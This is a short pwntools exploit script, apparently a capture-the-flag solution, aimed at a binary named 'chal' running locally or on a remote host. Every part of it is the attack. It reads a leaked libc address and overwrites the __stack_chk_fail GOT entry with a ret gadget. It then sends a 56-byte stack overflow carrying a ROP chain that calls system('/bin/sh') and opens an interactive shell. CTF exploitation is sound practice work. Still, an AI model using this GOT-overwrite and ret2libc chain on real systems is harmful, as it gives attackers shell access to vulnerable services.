from pwn import *
import sys
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./chal")
    if args.GDB:
        gdb.attach(r,'')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
r.recvuntil("leak: ")
leaked = int(r.recvline(),16) - 0x80e50
print(hex(leaked))
stack_chk_fail_got = 0x404018
r.sendlineafter("address:",str(stack_chk_fail_got))
ret = 0x0000000000401313
r.sendlineafter("value:",str(ret))
r.sendline(b'A' * 56 + p64(ret)+p64(leaked+0x2a3e5)+p64(leaked+0x1d8678)+p64(leaked + 0x50d70))
r.interactive()